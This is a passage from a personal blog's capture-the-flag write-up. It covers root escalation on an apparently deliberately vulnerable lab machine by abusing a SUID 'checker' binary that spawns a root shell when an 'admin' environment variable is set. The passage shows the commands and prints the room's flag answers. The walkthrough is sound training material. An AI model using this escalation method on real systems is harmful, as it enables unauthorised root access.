+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/mount
+/bin/fusermount
+/bin/umount
+/bin/ping
+/bin/su
+
+...
+</code></pre><p>Bingo! <code>/usr/sbin/checker</code> is HIGHLY suspicious</p>
+<p>Gtfobins said nope&hellip;so we are doomed!</p>
+<p>ok not really&hellip;it&rsquo;s a binary so we have to Reverse engineer this a bit</p>
+<p>I will try locally and if tools are not available I will download it and ghidra the stuff out of it</p>
+<pre tabindex="0"><code>checker
+Not an Admin
+</code></pre><p>Lol..that thing just prints that (I know I am not admin&hellip;yet)</p>
+<p>I tried strings but its not available&hellip;funny how they got ltrace and strace instead</p>
+<pre tabindex="0"><code>ltrace checker
+getenv(&#34;admin&#34;)                                  = nil
+puts(&#34;Not an Admin&#34;)                             = 13
+Not an Admin
++++ exited (status 0) +++
+</code></pre><p><code>getenv</code> is what matters here! it checks the content of the <code>admin</code> global variable</p>
+<p>So what happens when we modify that variable? I don&rsquo;t know&hellip;let&rsquo;s see</p>
+<pre tabindex="0"><code>export admin=test    
+ltrace checker
+getenv(&#34;admin&#34;)                                  = &#34;test&#34;
+setuid(0)                                        = -1
+system(&#34;/bin/bash&#34;
+</code></pre><p>Oh we get a shell! logic!</p>
+<p>And just like that&hellip;we are root!</p>
+<pre tabindex="0"><code>checker
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+</code></pre><p>Now if the &ldquo;flag&rdquo; in bjoel folder is not real? where is the real flag?</p>
+<pre tabindex="0"><code>find / -type f -name *user*.txt 2&gt;/dev/null
+/home/bjoel/user.txt
+/media/usb/user.txt
+
+cat /media/usb/user.txt
+billy_joel_did_nothing_wrong
+
+cat /root/root.txt
+we_didnt_start_the_fire_mp4
+</code></pre><p>lol silly games!</p>
+<p>I didnt read the instructions at start&hellip;we were even warned about the holes</p>
+<p>and also to add the domain name to our hosts file</p>
+<p>This room took me way too long to finish</p>
+<p>But I enjoyed every minute of it, and every rabbit hole</p>
+<p>(And I got that old song stuck in my head again)</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
